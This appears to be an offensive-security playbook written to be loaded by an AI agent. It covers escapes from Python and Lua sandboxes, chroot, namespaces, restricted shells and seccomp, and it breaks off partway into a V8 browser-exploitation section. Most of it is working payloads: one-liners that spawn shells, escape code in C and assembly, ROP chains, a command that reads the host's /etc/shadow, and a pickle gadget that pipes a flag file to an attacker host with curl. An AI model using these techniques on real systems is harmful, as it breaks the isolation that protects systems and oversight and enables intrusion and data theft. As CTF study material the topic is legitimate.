> **AI LOAD INSTRUCTION**: Expert sandbox escape techniques across Python, Lua, seccomp, chroot, Docker/container, and browser sandbox contexts. Covers CTF pyjail patterns, seccomp architecture confusion, chroot fd leaks, namespace escape, and Mojo IPC abuse. Distilled from ctf-wiki sandbox sections and real-world container escapes. Base models often miss the distinction between sandbox types and apply wrong escape techniques.

## 0. RELATED ROUTING

- [browser-exploitation-v8](../browser-exploitation-v8/SKILL.md) — V8 exploitation for renderer RCE before browser sandbox escape
- [container-escape-techniques](../container-escape-techniques/SKILL.md) — Docker/container specific escape techniques
- [kernel-exploitation](../kernel-exploitation/SKILL.md) — kernel exploit for container/namespace escape
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) — post-escape privilege escalation

### Advanced References

- [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) — Full pyjail methodology: `__builtins__` recovery, keyword bypass, AST bypass, pickle escape
- [SECCOMP_BYPASS.md](./SECCOMP_BYPASS.md) — Architecture confusion, io_uring bypass, ptrace bypass, allowed syscall chaining


## 1. SANDBOX TYPE IDENTIFICATION

| Sandbox Type | Indicators | Typical Context |
|---|---|---|
| Python sandbox (pyjail) | Limited builtins, filtered keywords, `exec`/`eval` available | CTF, online judges, Jupyter |
| Lua sandbox | No `os`, `io` modules; restricted metatables | Game scripting, config |
| seccomp | syscall filtering, `prctl(PR_SET_SECCOMP)` | CTF pwn, container hardening |
| chroot | Changed root filesystem, limited `/proc` access | Legacy isolation |
| Docker/container | Namespaces, cgroups, reduced capabilities | Cloud, microservices |
| Browser (renderer) | OS-level sandbox (seccomp-bpf + namespaces on Linux) | Chrome, Firefox |
| Namespace isolation | PID/mount/network/user namespace | Container runtimes |

---

## 2. PYTHON SANDBOX ESCAPE (OVERVIEW)

See [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) for full methodology.

### Quick Reference

| Technique | One-Liner |
|---|---|
| Subclass walk | `().__class__.__bases__[0].__subclasses__()` → find `os._wrap_close` → `__init__.__globals__['system']` |
| Import recovery | `__builtins__.__import__('os').system('sh')` |
| getattr bypass | `getattr(getattr(__builtins__, '__imp'+'ort__'), '__call__')('os')` |
| chr construction | `eval(chr(95)+chr(95)+'import'+chr(95)+chr(95))` |
| Pickle escape | `pickle.loads(b"cos\nsystem\n(S'sh'\ntR.")` |
| Code object | Construct `types.CodeType(...)` then `exec()` with custom bytecode |

---

## 3. LUA SANDBOX ESCAPE

### Restricted Environment Bypass

```lua
-- If debug library available:
debug.getinfo(1)                    -- information leakage
debug.getregistry()                 -- access global registry
debug.getupvalue(func, 1)           -- read closed-over variables
debug.setupvalue(func, 1, new_val)  -- overwrite upvalues

-- Recover os module via debug:
local getupvalue = debug.getupvalue
-- Walk upvalues of known functions to find references to os/io

-- If loadstring available:
loadstring("os.execute('sh')")()

-- If string.dump available:
-- Dump function bytecode, patch it, load modified function

-- Metatables escape:
-- If rawset/rawget blocked but __index/__newindex exists:
-- Forge metatable chain to access restricted globals
```

### Lua FFI Escape (LuaJIT)

```lua
-- LuaJIT FFI provides C function access
local ffi = require("ffi")
ffi.cdef[[ int system(const char *command); ]]
ffi.C.system("sh")

-- If require is blocked but ffi is preloaded:
-- Find ffi via package.loaded or debug.getregistry
```

---

## 4. CHROOT ESCAPE

| Technique | Condition | Method |
|---|---|---|
| Open fd to real root | File descriptor leaked from outside chroot | `fchdir(leaked_fd)` then `chroot(".")` |
| Double chroot | Process is root inside chroot | `mkdir("x"); chroot("x"); chdir("../../../..")` |
| TIOCSTI ioctl | Terminal access (fd 0 is a TTY) | Inject keystrokes to parent shell via `ioctl(0, TIOCSTI, &c)` |
| /proc access | `/proc` mounted inside chroot | `/proc/1/root/` → access real root filesystem |
| ptrace | CAP_SYS_PTRACE | Attach to process outside chroot |
| Mount namespace | Privileged | Mount real root into chroot |

### Double Chroot Escape

```c
// Must be root inside chroot
mkdir("/tmp/escape", 0755);
chroot("/tmp/escape");          // new chroot inside old chroot
// Old CWD is now outside the new chroot
// Navigate up to real root:
for (int i = 0; i < 100; i++) chdir("..");
chroot(".");                     // now at real root
execl("/bin/sh", "sh", NULL);
```

---

## 5. BROWSER SANDBOX ESCAPE (OVERVIEW)

### Chrome Sandbox Architecture (Linux)

```
Renderer Process:
  ├── seccomp-bpf (syscall filter)
  ├── PID namespace (isolated PIDs)
  ├── Network namespace (no direct network)
  ├── Mount namespace (minimal filesystem)
  └── Reduced capabilities (no CAP_SYS_ADMIN etc.)
```

### Escape Vectors

| Vector | Description |
|---|---|
| Mojo IPC bug | UAF or type confusion in Mojo interface handler in browser process |
| Shared memory corruption | Corrupt shared memory segments between renderer and browser |
| GPU process bug | Exploit GPU process (less sandboxed) as stepping stone |
| Kernel exploit | Escape directly via kernel vulnerability (bypasses all sandboxing) |
| Signal handling | Race condition in signal delivery across sandbox boundary |

### Mojo Interface Attack Pattern

```
1. Renderer RCE achieved (via V8/Blink bug)
2. Enumerate available Mojo interfaces from renderer
3. Find vulnerable interface (UAF on message handling, integer overflow in parameter validation)
4. Craft malicious Mojo message → trigger bug in browser process
5. Browser process is unsandboxed → full system access
```

---

## 6. NAMESPACE ESCAPE

### User Namespace Escalation

```bash
# If allowed to create user namespaces (unprivileged):
unshare -Urm  # Create new user + mount namespace as root inside
# Inside namespace: can mount, modify, etc.
# Escape requires kernel bug or misconfiguration
```

### PID Namespace Escape

```bash
# If /proc is from host (misconfigured container):
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# Enters init process namespaces → host access
```

### Mount Namespace Tricks

```bash
# If can see host filesystem via /proc/1/root:
ls -la /proc/1/root/  # host root filesystem
cat /proc/1/root/etc/shadow  # read host files

# If can mount:
mount -t proc proc /proc
# Access host /proc entries
```

---

## 7. RBASH / RESTRICTED SHELL ESCAPE

| Technique | Method |
|---|---|
| vi/vim | `:!/bin/bash` or `:set shell=/bin/bash` then `:shell` |
| less/more | `!/bin/bash` |
| awk | `awk 'BEGIN {system("/bin/bash")}'` |
| find | `find / -exec /bin/bash \;` |
| python/perl/ruby | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| ssh | `ssh user@host -t /bin/bash` |
| Environment | `export PATH=/usr/bin:/bin; /bin/bash` |
| cp | Copy `/bin/bash` to allowed directory |
| git | `git help config` → then `!/bin/bash` in pager |
| Encoding | `echo /bin/bash | base64 -d | sh` |

---

## 8. DECISION TREE

```
What type of sandbox?
├── Python sandbox (pyjail)?
│   └── See PYTHON_SANDBOX_ESCAPE.md
│       ├── __builtins__ available? → direct import
│       ├── Subclass walk: ().__class__.__bases__[0].__subclasses__()
│       ├── Keywords filtered? → chr()/getattr() construction
│       └── eval/exec available? → code object manipulation
│
├── Lua sandbox?
│   ├── debug library available? → getregistry/getupvalue
│   ├── FFI available (LuaJIT)? → ffi.C.system()
│   ├── loadstring available? → load arbitrary code
│   └── All restricted? → metatable chain exploitation
│
├── seccomp filter?
│   └── See SECCOMP_BYPASS.md
│       ├── Architecture confusion (32-bit syscalls from 64-bit)
│       ├── Allowed syscalls → ORW chain
│       ├── io_uring allowed? → bypass via io_uring
│       └── ptrace allowed? → debug child process
│
├── chroot jail?
│   ├── Root inside chroot? → double chroot escape
│   ├── Leaked fd? → fchdir to real root
│   ├── /proc mounted? → /proc/1/root access
│   └── Terminal access? → TIOCSTI injection
│
├── Container / Docker?
│   ├── Privileged container? → mount host, load kernel module
│   ├── Mounted docker.sock? → docker API → escape
│   ├── See ../container-escape-techniques/SKILL.md
│   └── Kernel exploit → full escape
│
├── Browser sandbox?
│   ├── Have renderer RCE? → target Mojo IPC for browser escape
│   ├── GPU process accessible? → less-sandboxed stepping stone
│   └── Kernel exploit → bypass sandbox entirely
│
└── Restricted shell (rbash)?
    └── Find any interactive program (vi, less, python, awk, git)
```


---
# Part 5: Python Sandbox Escape


## 1. __builtins__ RECOVERY VIA SUBCLASS WALKING

The fundamental technique: walk Python's class hierarchy to find useful classes.

### The Chain

```python
# Start from any object literal
().__class__                          # <class 'tuple'>
().__class__.__bases__                # (<class 'object'>,)
().__class__.__bases__[0]             # <class 'object'>
().__class__.__bases__[0].__subclasses__()  # ALL loaded classes

# Find useful subclass (index varies by Python version):
# Look for: os._wrap_close, warnings.catch_warnings, subprocess.Popen
# Example: find os._wrap_close
for i, cls in enumerate(''.__class__.__bases__[0].__subclasses__()):
    if 'wrap_close' in str(cls):
        print(i, cls)
        break

# Access os.system via __init__.__globals__
().__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__['system']('sh')
```

### Common Useful Subclasses

| Class | Access | Use |
|---|---|---|
| `os._wrap_close` | `.__init__.__globals__['system']` | Command execution |
| `warnings.catch_warnings` | `.__init__.__globals__['__builtins__']['__import__']` | Recover `__import__` |
| `subprocess.Popen` | Direct: `Popen(['sh'], ...)` | Command execution |
| `importlib._bootstrap._ModuleLock` | `.__init__.__globals__` | Access import machinery |
| `codecs.IncrementalDecoder` | `.__init__.__globals__` | Another globals access point |

### Alternative Starting Points

```python
''.__class__.__mro__[1].__subclasses__()   # from string
[].__class__.__mro__[1].__subclasses__()   # from list
{}.__class__.__mro__[1].__subclasses__()   # from dict
(0).__class__.__mro__[1].__subclasses__()  # from int
True.__class__.__mro__[1].__subclasses__() # from bool
```


## 2. KEYWORD BYPASS TECHNIQUES

### When import/os/system are Filtered

```python
# String concatenation
__builtins__.__dict__['__imp'+'ort__']('o'+'s').system('sh')

# getattr
getattr(__builtins__, '__import__')('os').system('sh')
getattr(getattr(__builtins__, '__impo' + 'rt__')('o' + 's'), 'system')('sh')

# chr() construction
eval(chr(95)*2 + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95)*2)
# Builds "__import__"

# Hex escape in string
eval("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f('os').system('sh')")

# Unicode escape
eval("\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f('os')")

# Base64
import base64
eval(base64.b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3NoJyk='))
```

### When Quotes are Filtered

```python
# Use chr() to build strings without quotes
s = chr(115) + chr(104)  # "sh"
__import__(chr(111)+chr(115)).system(s)

# Use bytes/bytearray
eval(bytes([111, 115]).decode())  # "os"

# Use input() in Python 2 (reads from stdin)
# Use dict keys: list({1:2})[0].__class__.__name__  etc.
```

### When Dots are Filtered

```python
# Use getattr
getattr(getattr(__builtins__, '__import__')('os'), 'system')('sh')

# Use __getattribute__
''.__class__.__getattribute__(''.__class__, '__bases__')
```

### When Parentheses are Filtered

```python
# Python 2: print is a statement
# Python 3: decorators, class definitions, or __init_subclass__
@exec
@input
class X:
    pass
# Prompts for input, evaluates as Python code

# Using __init_subclass__
class Exploit:
    def __init_subclass__(cls, **kwargs):
        __import__('os').system('sh')

class Trigger(Exploit):
    pass
```

---

## 3. AST-BASED SANDBOX BYPASS

Some sandboxes parse the AST and block dangerous nodes.

### Common AST Restrictions and Bypasses

| Blocked AST Node | Bypass |
|---|---|
| `ast.Import` / `ast.ImportFrom` | Use `__import__()` call instead |
| `ast.Call` | Use decorators, `__init_subclass__`, or class instantiation side effects |
| `ast.Attribute` (dot access) | Use `getattr()` or `__getattribute__` |
| `ast.Subscript` (`[]`) | Use `__getitem__` method |
| All expressions | Use format strings: `f"{__import__('os').system('sh')}"` |

### Bypassing Call Restriction

```python
# If ast.Call is blocked but ast.FunctionDef is allowed:
class X:
    __class_getitem__ = staticmethod(exec)
X['__import__("os").system("sh")']  # Subscript triggers exec

# Or via __init_subclass__
class Base:
    def __init_subclass__(cls, cmd='', **kwargs):
        __import__('os').system(cmd)
class Evil(Base, cmd='sh'):
    pass
```

---

## 4. RESTRICTEDPYTHON BYPASS

RestrictedPython is used in Plone/Zope and some CTFs.

### Key Restrictions and Escapes

| Restriction | Bypass |
|---|---|
| No `_` prefix attributes | Use `getattr` with computed string |
| No `__import__` | Walk `__subclasses__` to find import mechanism |
| `_getattr_` wrapper | Find code path that doesn't go through `_getattr_` |
| `_getiter_` wrapper | Use `map`/`filter` instead of direct iteration |

```python
# RestrictedPython typically instruments attribute access with _getattr_
# Bypass by accessing __globals__ through method __func__
[x for x in ().__class__.__bases__[0].__subclasses__()
 if 'BuiltinImporter' in str(x)][0].load_module('os').system('sh')
```

---

## 5. FILE READ WITHOUT open()

```python
# help() function leaks file contents
help.__class__.__init__.__globals__  # access globals

# license() / credits() in interactive mode
# They use open() internally

# pathlib
from pathlib import Path
Path('/etc/passwd').read_text()

# os module
import os
os.read(os.open('/etc/passwd', os.O_RDONLY), 1000)

# codecs
import codecs
codecs.open('/etc/passwd').read()

# URL handlers
import urllib.request
urllib.request.urlopen('file:///etc/passwd').read()

# linecache
import linecache
linecache.getlines('/etc/passwd')
```

---

## 6. PICKLE DESERIALIZATION ESCAPE

If the sandbox uses `pickle.loads()` on untrusted data:

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('sh',))

# Serialize
payload = pickle.dumps(Exploit())

# Raw pickle opcodes (no Python class needed):
# cos\nsystem\n(S'sh'\ntR.
payload = b"cos\nsystem\n(S'sh'\ntR."
pickle.loads(payload)  # executes os.system('sh')
```

### Advanced Pickle Gadgets

```python
# Multi-stage: read file + send over network
payload = b"""(S'curl http://attacker/?flag='
ios
system
(S'cat /flag | curl -d @- http://attacker/'
tR."""

# Using __import__ in pickle:
# c__builtin__\n__import__\n(S'os'\ntRp0\n(S'system'\ng0\ntR
```

---

## 7. CODE OBJECT MANIPULATION

Construct a Python code object to bypass restrictions on `exec`/`eval`.

```python
import types

# Build code object that calls os.system
code = types.CodeType(
    0,                   # argcount
    0,                   # posonlyargcount (Python 3.8+)
    0,                   # kwonlyargcount
    2,                   # nlocals
    4,                   # stacksize
    0,                   # flags
    b'\x97\x00...',      # bytecode (platform-specific)
    (None,),             # constants
    ('__import__', 'os', 'system', 'sh'),  # names
    (),                  # varnames
    'exploit',           # filename
    'exploit',           # name
    1,                   # firstlineno
    b'',                 # lnotab
)
exec(code)
```

### Simpler: Compile + Modify

```python
# Compile allowed code, modify bytecode to do something else
c = compile("pass", "<x>", "exec")
# Replace co_code, co_consts, co_names in the code object
# Then exec(modified_code)
```

---

## 8. PYTHON 2 vs PYTHON 3 DIFFERENCES

| Aspect | Python 2 | Python 3 |
|---|---|---|
| `input()` | Evaluates expression (dangerous) | Reads string (safe) |
| `exec` | Statement: `exec "code"` | Function: `exec("code")` |
| String types | `str` (bytes) + `unicode` | `str` (unicode) + `bytes` |
| `file()` builtin | Exists: `file('/etc/passwd').read()` | Removed |
| Division | Integer division by default | Float division |
| `__builtins__` | Module or dict (context-dependent) | Module or dict |

---

## 9. CTF PYJAIL QUICK CHECKLIST

```
1. What Python version? (2 vs 3, exact minor)
2. What's available in __builtins__?
3. Is eval/exec available?
4. Is __import__ available?
5. Are underscores (_) allowed?
6. Are dots (.) allowed?
7. Are parentheses allowed?
8. Are quotes (' ") allowed?
9. Character length limit?
10. Newline allowed? (multi-statement)
11. Is output returned to you?
12. What modules are pre-imported?
13. Is the jail forking or threading?
14. Any AST-level restrictions?
15. Is pickle/marshal/shelve used anywhere?
```

---

## 10. DECISION TREE

```
Python sandbox escape
├── __builtins__ intact?
│   ├── YES → __import__('os').system('sh')
│   └── NO → need to recover builtins
├── Can access __class__/__bases__/__subclasses__?
│   ├── YES → subclass walk to find os/subprocess
│   └── NO (underscores blocked)
│       ├── getattr available? → getattr((), chr(95)*2 + 'class' + chr(95)*2)
│       └── Everything blocked? → try decorators, f-strings, code objects
├── Keywords filtered?
│   ├── String concat: 'im'+'port'
│   ├── chr(): chr(105)+chr(109)+...
│   ├── Hex: "\x69\x6d\x70\x6f\x72\x74"
│   └── getattr + computed string
├── eval/exec available?
│   ├── YES → construct payload string + eval/exec
│   └── NO → class tricks (__init_subclass__, __class_getitem__)
├── Pickle/marshal in scope?
│   └── YES → craft malicious pickle → os.system via __reduce__
└── Need file read only (no exec)?
    ├── pathlib.Path.read_text()
    ├── os.read(os.open(...))
    └── linecache.getlines()
```


---
# Part 6: Seccomp Bypass


## 1. SECCOMP FUNDAMENTALS

### Seccomp Modes

| Mode | Set Via | Behavior |
|---|---|---|
| Strict mode | `prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT)` | Only `read`, `write`, `exit`, `sigreturn` allowed |
| Filter mode (BPF) | `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, prog)` | Custom BPF program decides per syscall |

### BPF Filter Structure

```c
struct seccomp_data {
    int nr;           // syscall number
    __u32 arch;       // AUDIT_ARCH_X86_64, AUDIT_ARCH_I386, etc.
    __u64 instruction_pointer;
    __u64 args[6];    // syscall arguments
};
```

### Reading seccomp Rules

```bash
# Dump seccomp filter from binary
seccomp-tools dump ./binary

# Output example:
# line  CODE  JT JF K
# 0000: 0x20 00 00 00000004   A = arch
# 0001: 0x15 00 05 c000003e   if (A != ARCH_X86_64) goto 0007
# 0002: 0x20 00 00 00000000   A = sys_number
# 0003: 0x15 03 00 0000003b   if (A == execve) goto 0007  (KILL)
# 0004: 0x15 02 00 00000142   if (A == execveat) goto 0007 (KILL)
# 0005: 0x06 00 00 7fff0000   return ALLOW
```


## 2. ARCHITECTURE CONFUSION

**x86_64 processes can invoke x86 (32-bit) syscalls using `int 0x80`.** Syscall numbers differ between architectures.

### Attack Scenario

```
seccomp filter:
  if arch != AUDIT_ARCH_X86_64 → KILL  (blocks 32-bit)
  if nr == 59 (execve) → KILL
  else → ALLOW

Bypass: The filter checks arch correctly. NOT vulnerable to simple confusion.

Vulnerable filter:
  if nr == 59 (execve) → KILL      ← only checks x86_64 syscall numbers
  else → ALLOW
  (no arch check!)

Bypass:
  Use int 0x80 with 32-bit syscall number for execve (11, not 59)
  Filter sees nr=11, doesn't match 59 → ALLOW → execve executes!
```

### x86 vs x86_64 Syscall Number Table (Key Differences)

| Syscall | x86_64 nr | x86 (32-bit) nr |
|---|---|---|
| read | 0 | 3 |
| write | 1 | 4 |
| open | 2 | 5 |
| execve | 59 | 11 |
| mmap | 9 | 90 (old) / 192 (mmap2) |
| mprotect | 10 | 125 |

### Exploitation Code

```nasm
; 32-bit execve via int 0x80 from 64-bit process
; Note: registers are truncated to 32 bits
mov ebx, binsh_addr_low32    ; arg1: filename (must be in low 4GB)
xor ecx, ecx                 ; arg2: argv = NULL
xor edx, edx                 ; arg3: envp = NULL
mov eax, 11                  ; __NR_execve (32-bit)
int 0x80                     ; invoke 32-bit syscall interface
```

**Constraint**: All addresses must be in the lower 4GB (32-bit addressable). Use `mmap(addr, size, ..., MAP_32BIT, ...)` or ensure data is on stack (which may be below 4GB on some configs).

---

## 3. ORW (OPEN-READ-WRITE) CHAIN

When `execve` is blocked but `open`/`read`/`write` are allowed:

### ROP-based ORW

```python
# Build ROP chain for: open("flag") → read(fd, buf, size) → write(1, buf, size)
rop = b''
# open("flag", O_RDONLY)
rop += p64(pop_rdi) + p64(flag_str_addr)
rop += p64(pop_rsi) + p64(0)           # O_RDONLY
rop += p64(pop_rax) + p64(2)           # SYS_open
rop += p64(syscall_ret)
# read(3, buf, 0x100) — fd=3 (first opened file)
rop += p64(pop_rdi) + p64(3)
rop += p64(pop_rsi) + p64(buf_addr)
rop += p64(pop_rdx) + p64(0x100)
rop += p64(pop_rax) + p64(0)           # SYS_read
rop += p64(syscall_ret)
# write(1, buf, 0x100)
rop += p64(pop_rdi) + p64(1)           # stdout
rop += p64(pop_rsi) + p64(buf_addr)
rop += p64(pop_rdx) + p64(0x100)
rop += p64(pop_rax) + p64(1)           # SYS_write
rop += p64(syscall_ret)
```

### Shellcode-based ORW

```nasm
; open
lea rdi, [rip + flag_path]
xor rsi, rsi
mov rax, 2
syscall
; read
mov rdi, rax          ; fd from open
lea rsi, [rsp - 0x100]
mov rdx, 0x100
xor rax, rax
syscall
; write
mov rdi, 1
mov rdx, rax          ; bytes read
lea rsi, [rsp - 0x100]
mov rax, 1
syscall
flag_path: .ascii "flag\x00"
```

### When open is Blocked but openat Allowed

```python
# SYS_openat(AT_FDCWD, "flag", O_RDONLY)
# AT_FDCWD = -100 (0xffffffffffffff9c)
rop += p64(pop_rdi) + p64(0xffffffffffffff9c)  # AT_FDCWD
rop += p64(pop_rsi) + p64(flag_str_addr)
rop += p64(pop_rdx) + p64(0)
rop += p64(pop_rax) + p64(257)                  # SYS_openat
rop += p64(syscall_ret)
```

---

## 4. io_uring BYPASS

`io_uring` is a Linux async I/O interface (kernel ≥ 5.1). io_uring operations are handled by **kernel worker threads** which may bypass seccomp filters applied to the calling thread.

### Why It Works

- seccomp filters are per-thread
- io_uring submission creates kernel work items processed by kworker
- kworker threads may not inherit the seccomp filter (kernel version dependent)
- Patched in kernel ≥ 5.12 (`IORING_SETUP_R_DISABLED` and seccomp propagation)

### Attack

```c
// Setup io_uring ring
struct io_uring ring;
io_uring_queue_init(8, &ring, 0);

// Submit IORING_OP_OPENAT + IORING_OP_READ + IORING_OP_WRITE
// These operations execute in kernel context, bypassing user seccomp

struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
io_uring_prep_openat(sqe, AT_FDCWD, "/flag", O_RDONLY, 0);
sqe->user_data = 1;
io_uring_submit(&ring);
// ... read completion, submit read, write operations ...
```

**Status**: Fixed in modern kernels. io_uring operations now respect seccomp of the submitting thread.

---

## 5. PTRACE-BASED BYPASS

If `ptrace` syscall is allowed by seccomp:

```c
// Fork child process (if fork allowed)
pid_t pid = fork();
if (pid == 0) {
    // Child: wait for parent to attach
    raise(SIGSTOP);
    execve("/bin/sh", NULL, NULL);  // will be intercepted by parent
} else {
    // Parent: attach to child
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    // Child's execve may succeed if child doesn't have seccomp
    // Or: inject syscalls into child via PTRACE_POKETEXT
}
```

### Injection via ptrace

```c
// Write syscall instruction into child's memory
ptrace(PTRACE_POKETEXT, pid, addr, syscall_bytes);
// Set child's registers
struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
regs.rax = 59;  // execve
regs.rdi = binsh_addr;
regs.rsi = 0;
regs.rdx = 0;
regs.rip = addr;
ptrace(PTRACE_SETREGS, pid, NULL, &regs);
ptrace(PTRACE_CONT, pid, NULL, NULL);
```

---

## 6. ALLOWED SYSCALL CHAINING

Build useful primitives from seemingly-harmless allowed syscalls:

| Allowed Syscall | Primitive |
|---|---|
| `mmap` + `mprotect` | Allocate RWX page → write shellcode → jump |
| `mprotect` alone | Make existing page executable |
| `sendfile` | `sendfile(stdout_fd, file_fd, NULL, size)` → exfiltrate file without read() |
| `splice` + `tee` | Move data between fds without read/write |
| `process_vm_readv` | Read another process's memory |
| `prctl(PR_SET_NAME)` | Write 16 bytes to kernel-visible comm field |
| `memfd_create` + `execveat` | Create anonymous file → execute it (if both allowed) |

### sendfile ORW Alternative

```python
# If read/write blocked but sendfile allowed:
# open flag file
rop += pop_rdi + flag_str + pop_rsi + p64(0) + pop_rax + p64(2) + syscall_ret
# sendfile(1, 3, NULL, 0x100)  — out_fd=stdout, in_fd=3
rop += pop_rdi + p64(1) + pop_rsi + p64(3) + pop_rdx + p64(0)
rop += pop_r10 + p64(0x100) + pop_rax + p64(40) + syscall_ret  # SYS_sendfile=40
```

---

## 7. NAMESPACE + SECCOMP INTERACTION

### unshare for Filesystem Access

If `unshare` is allowed:

```c
// Create new mount namespace
unshare(CLONE_NEWNS);
// Mount procfs or other filesystems
mount("proc", "/proc", "proc", 0, NULL);
// Access files via /proc that weren't available before
```

### User Namespace Tricks

```c
// Create user namespace (unprivileged)
unshare(CLONE_NEWUSER);
// Inside: UID 0 (fake root)
// Can mount FUSE, access /proc differently
// Some seccomp filters don't account for namespace changes
```

---

## 8. RETURN VALUE MANIPULATION

### SECCOMP_RET_ERRNO

Some filters return `SECCOMP_RET_ERRNO` instead of `SECCOMP_RET_KILL`. The syscall fails but the process continues.

```c
// If filter returns ERRNO for dangerous calls:
// Process survives → try alternative syscalls
// Example: execve returns EPERM → try execveat instead
// Or: brute-force which syscalls are allowed vs killed vs ERRNO
```

### SECCOMP_RET_TRACE

If filter uses `SECCOMP_RET_TRACE`, a tracer (ptrace parent) can modify syscall number and arguments before execution.

---

## 9. DECISION TREE

```
seccomp filter active
├── Dump rules: seccomp-tools dump ./binary
├── Architecture check present?
│   ├── NO → architecture confusion (use int 0x80 for 32-bit syscalls)
│   └── YES → 32-bit bypass blocked
├── What's blocked?
│   ├── Only execve/execveat → ORW chain (open+read+write or openat+read+write)
│   ├── execve + open → openat? sendfile? io_uring?
│   ├── execve + open + openat → io_uring (if kernel < 5.12)?
│   └── Whitelist mode (only specific allowed)?
│       ├── mmap + mprotect allowed? → shellcode execution
│       ├── sendfile allowed? → file exfiltration without read/write
│       ├── ptrace allowed? → inject syscalls into child
│       └── Check every alternative: splice, tee, process_vm_readv
├── Kernel version?
│   ├── < 5.1 → no io_uring available
│   ├── 5.1–5.11 → io_uring bypass possible
│   └── ≥ 5.12 → io_uring seccomp-aware
├── Can fork/clone?
│   ├── YES + ptrace allowed → inject syscalls into child process
│   └── NO → single-process escape only
└── RET_KILL vs RET_ERRNO?
    ├── RET_KILL → process dies on violation (must avoid blocked calls)
    └── RET_ERRNO → process survives, try alternative syscalls
```


---
# Part 7: Browser/V8 Exploitation


# SKILL: Browser / V8 Exploitation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert V8/Chrome exploitation techniques. Covers V8 compilation pipeline, JIT type confusion, addrof/fakeobj primitives, ArrayBuffer corruption, WASM RWX pages, V8 sandbox (pointer compression), and Chrome sandbox escape overview. Distilled from ctf-wiki browser sections, Project Zero research, and CTF competition patterns. Base models often confuse V8 object representation details and miss the pointer compression barrier.

## 0. RELATED ROUTING

- [sandbox-escape-techniques](../sandbox-escape-techniques/SKILL.md) — Chrome renderer sandbox escape via IPC/Mojo
- [heap-exploitation](../heap-exploitation/SKILL.md) — general heap concepts applicable to V8 heap
- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) — ROP concepts for native code execution after V8 escape
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — ASLR/NX bypass in browser context

### Advanced Reference

Load [V8_EXPLOITATION_PATTERNS.md](./V8_EXPLOITATION_PATTERNS.md) when you need:
- Detailed exploitation patterns and code templates
- Heap layout manipulation and GC interaction
- V8 sandbox bypass techniques
- Object map confusion patterns


## 1. V8 ARCHITECTURE

### Compilation Pipeline

```
JavaScript Source
    ↓ Parser
  AST (Abstract Syntax Tree)
    ↓ Ignition
  Bytecode (interpreted, profiling)
    ↓ Sparkplug (non-optimizing baseline, V8 ≥ 9.1)
  Baseline code (fast startup)
    ↓ Maglev (mid-tier, V8 ≥ 10.2)
  Mid-optimized code
    ↓ TurboFan (optimizing JIT)
  Optimized machine code (with speculative optimizations)
    ↓ Deoptimization (if speculation fails)
  Back to Ignition bytecode
```

### Key V8 Concepts

| Concept | Description |
|---|---|
| Tagged pointers | SMI (Small Integer): `value << 1`, HeapObject: `ptr \| 1` |
| Pointer compression | V8 ≥ 8.0: objects addressed via 32-bit offset from cage base (4GB sandbox) |
| Maps (Hidden Classes) | Define object shape: property names, types, offsets |
| Elements kinds | Internal array type: `PACKED_SMI_ELEMENTS`, `PACKED_DOUBLE_ELEMENTS`, `PACKED_ELEMENTS`, etc. |
| Write barrier | GC bookkeeping when heap pointers are written |
| Garbage collection | Orinoco GC: minor (Scavenge) and major (Mark-Compact) |

### Object Representation (64-bit, pointer compression)

```
HeapObject in V8 heap (compressed):
  +0x00: Map pointer (compressed, 32-bit offset)
  +0x04: Properties/Hash
  +0x08: Elements pointer (compressed)
  +0x0C: Length (for arrays)
  +0x10: Inline properties or backing store data
```

---

## 2. COMMON V8 BUG CLASSES

| Bug Class | Description | Example |
|---|---|---|
| JIT Type Confusion | TurboFan assumes wrong type after optimization | Speculative type guard eliminated, wrong operation applied |
| Incorrect Bounds Elimination | JIT removes array bounds check based on wrong range analysis | `CheckBounds` node eliminated → OOB access |
| Prototype Chain Confusion | Optimization assumes stable prototype, mutations invalidate | Prototype change after optimization → wrong property access |
| Turbofan Reduction Bug | Incorrect strength reduction or constant folding | Integer overflow in range analysis |
| Race Condition | SharedArrayBuffer + worker thread race | Type confusion via concurrent modification |
| Off-by-one in Builtin | Boundary error in built-in function implementation | String/Array bounds |
| Typer Bug | Incorrect type range computation in TurboFan | `Typer` says value is in [0, N] but can be N+1 |

### Triggering JIT Optimization

```javascript
function vuln(arr) {
    // ... vulnerable code path ...
}
// Force optimization by calling many times
for (let i = 0; i < 100000; i++) {
    vuln(arr);
}
// Or use V8 intrinsics (d8 only):
%OptimizeFunctionOnNextCall(vuln);
vuln(arr);
```

---

## 3. EXPLOITATION PRIMITIVES

### addrof — Leak Object Address

```javascript
// Goal: get the raw heap address of a JavaScript object
// Method: type confusion between object array and float array
// If we can confuse PACKED_ELEMENTS array with PACKED_DOUBLE_ELEMENTS:
// - Write object reference to element of object array
// - Read same element as double from confused float array
// - Float bits = compressed pointer of the object

function addrof(obj) {
    // Setup depends on specific bug
    // Typically: trigger type confusion so array reads obj ref as float
    object_array[0] = obj;
    return ftoi(confused_float_array[0]);  // float-to-int conversion
}
```

### fakeobj — Create Fake Object Reference

```javascript
// Goal: create a JS reference to an arbitrary heap address
// Method: reverse of addrof — write float (raw pointer bits) to float array,
//         read from confused object array → treated as object reference

function fakeobj(addr) {
    confused_float_array[0] = itof(addr);  // int-to-float conversion
    return object_array[0];                 // now a "pointer" to addr
}
```

### Building Arbitrary R/W from addrof + fakeobj

```javascript
// 1. Create a Float64Array with known layout
